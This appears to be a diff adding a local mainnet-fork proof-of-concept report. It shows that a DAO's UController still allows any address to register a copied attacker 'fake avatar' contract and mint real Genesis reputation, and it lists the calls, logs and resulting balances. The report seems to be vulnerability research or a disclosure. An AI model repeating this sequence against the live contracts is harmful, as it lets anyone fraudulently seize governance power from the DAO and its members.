@@ -1,0 +1,18 @@
+LOCAL ANVIL FORK TEST — re-arm proof (no mainnet transaction)
+Fork: https://ethereum-rpc.publicnode.com (public), anvil 1.8.5, chain id 1, latest block ~26,201,68x
+Method: copied the BYTE-EXACT runtime of the on-chain attacker fake avatar 0xd9902ea5... to a fresh
+address 0x1111...1111 on the fork, set its slot0 (owner) to the UController, then ran two LOCAL
+transactions with a funded local account (0x7099...79C8) that has no relation to the DAO.
+
+1) sanity: owner() => 0xD5bEe5D9Ae589094c51e533f35656963fdA87305 ; nativeReputation() #1 read => 0x0 (decoy)
+2) newOrganization(0x1111...1111) from 0x7099...79C8  -> status 1 (SUCCESS)
+   log: RegisterScheme(0xd5bee5d9...) topics: [0x521230fe..., sender=0x7099..., scheme=0x7099..., avatar=0x1111...]
+3) isSchemeRegistered(0x7099..., 0x1111...) => true ; getSchemePermissions => 0x0000001f
+4) mintReputation(1234e18, 0x7099..., 0x1111...) from 0x7099... -> status 1 (SUCCESS)
+   logs: MintReputation(0xd5bee5d9): sender=0x7099..., to=0x7099..., amount=1234e18, avatar=0x1111...;
+         Reputation(0x62562941...) Mint(0x7099..., 1234e18)   <- REAL Genesis reputation minted
+5) reputationOf(0x7099...) on the real Genesis Reputation contract: 0 -> 1234e18
+
+Conclusion: as of the current chain state, any unrelated address can still (a) register a caller-supplied
+fake avatar over the victim's real Reputation via UController.newOrganization (permissionless, no uniqueness
+guard survives the shape-shifting getters), and (b) mint real Genesis reputation through it.
